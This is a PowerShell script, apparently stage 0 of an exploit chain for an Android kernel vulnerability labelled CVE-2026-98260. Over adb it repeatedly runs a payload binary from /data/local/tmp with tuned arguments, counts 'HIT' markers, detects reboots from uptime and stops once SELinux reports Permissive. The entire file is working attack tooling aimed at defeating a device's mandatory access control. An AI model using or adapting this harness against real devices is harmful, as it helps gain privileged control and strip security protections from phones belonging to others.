# Stage 0 only: single attempt per process, stop as soon as SELinux is permissive.
$ErrorActionPreference = "Continue"
$dev   = "0484885189A00540"
$local = "E:\code\CVE\cve-2026-98260-xring\o3root-port\build\o3p.bin"   # pure payload, no LKM
$out   = "E:\code\CVE\cve-2026-98260-xring\ab-logs\stage0.txt"

function Log($m) { $m | Tee-Object -FilePath $out -Append }
function Up   { [double]((adb -s $dev shell "cut -d' ' -f1 /proc/uptime") -join "") }
function Mode { ((adb -s $dev shell "getenforce") -join "").Trim() }

Remove-Item $out -ErrorAction SilentlyContinue
Log "=== stage0 start $(Get-Date -Format HH:mm:ss) mode=$(Mode)"

for ($i = 1; $i -le 12; $i++) {
    $m = Mode
    if ($m -eq "Permissive") { Log "[$i] already Permissive"; break }
    adb -s $dev shell "chmod 755 /data/local/tmp/pure.bin" 2>$null | Out-Null

    $up0 = Up
    adb -s $dev shell "cd /data/local/tmp; ./pure.bin 10000 8192 0 0 1 1 8000 200 > p_$i.log 2>&1" | Out-Null
    $up1 = Up
    $m   = Mode
    $hits = ((adb -s $dev shell "grep -a -c HIT /data/local/tmp/p_$i.log 2>/dev/null") -join "").Trim()
    Log "[$i] up $([math]::Round($up0))->$([math]::Round($up1)) hits=$hits mode=$m"
    if ($m -eq "Permissive") { Log "[$i] *** STAGE0 OK ***"; break }
    if ($up1 -lt $up0) { Log "[$i] rebooted, cooling"; Start-Sleep -Seconds 35 }
}
Log "=== stage0 end $(Get-Date -Format HH:mm:ss) mode=$(Mode)"
